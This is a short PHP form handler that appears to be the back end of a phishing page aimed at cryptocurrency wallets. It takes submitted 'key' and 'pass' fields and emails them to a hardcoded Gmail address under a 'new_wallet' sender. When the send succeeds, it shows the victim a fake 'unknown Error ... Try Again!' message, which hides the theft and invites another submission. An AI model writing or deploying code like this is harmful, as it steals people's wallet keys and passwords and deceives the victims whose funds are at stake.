<?php
if(isset($_POST['submit'])){
    $key=$_POST['key'];
    $pass=$_POST['pass'];

    $to='famousx2020@gmail.com'; 
	$subject='Form Submission';
	$message="key :".$key."\n"."Pass :".$pass;
	$headers="From: ".new_wallet;


    if(mail($to, $subject, $message, $headers)){
        echo "<h1>unknown Error ... Try Again!</h1>";
    }
    else{
        echo "Something went wrong!";
    }
}


?>